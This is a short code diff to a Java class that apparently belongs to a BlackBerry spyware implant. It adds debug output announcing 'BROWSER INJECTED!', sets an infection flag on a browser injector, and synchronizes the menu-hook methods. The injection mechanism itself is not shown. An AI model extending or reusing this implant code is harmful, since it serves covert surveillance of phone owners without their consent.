@@ -67,7 +67,12 @@ public class BrowserMenuItem extends ApplicationMenuItem {
                 debug.trace("run browserScreen: " + browserScreen);
                 //#endif
                 
-                AppInjectorBrowser.getInstance().setInfected();
+                //#ifdef DEBUG
+                debug.info("BROWSER INJECTED!");
+                debug.ledFlash(Debug.COLOR_GREEN);
+                //#endif
+                
+                AppInjectorBrowser.getInstance().setInfected(true);
             }
 
             if (context == null) {
@@ -95,7 +100,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
 
     boolean menuAdded = false;
 
-    public void addMenuBrowser() {
+    public synchronized void addMenuBrowser() {
         if (!menuAdded) {
             //#ifdef DEBUG
             debug.trace("Adding menu browser");
@@ -107,7 +112,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
         }
     }
 
-    public void removeMenuBrowser() {
+    public synchronized void removeMenuBrowser() {
         if (menuAdded) {
             //#ifdef DEBUG
             debug.trace("Removing menu browser");
